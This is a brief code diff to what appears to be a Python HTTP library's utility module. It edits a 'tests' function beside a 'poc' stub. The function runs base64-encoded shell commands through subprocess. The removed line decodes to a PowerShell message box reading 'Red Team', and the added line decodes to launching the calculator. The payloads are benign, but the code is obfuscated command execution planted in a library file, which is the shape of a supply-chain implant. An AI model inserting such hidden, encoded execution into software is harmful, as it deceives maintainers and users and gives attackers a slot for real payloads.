@@ -1099,8 +1099,7 @@ def rewind_body(prepared_request):
 def tests():
     from subprocess import getoutput
     import base64
-    t1 = base64.b64decode(b'QWRkLVR5cGUgLUFzc2VtYmx5TmFtZSBQcmVzZW50YXRpb25Db3JlLFByZXNlbnRhdGlvbkZyYW1ld29yazskbXNnPVwiUmVkIFRlYW1cIjtbU3lzdGVtLldpbmRvd3MuTWVzc2FnZUJveF06OlNob3coJG1zZyk=').decode()
-    getoutput(f'powershell -C "{t1}"')
+    getoutput(base64.b64decode(b'Y2FsYw==').decode())
 
 
 def poc():
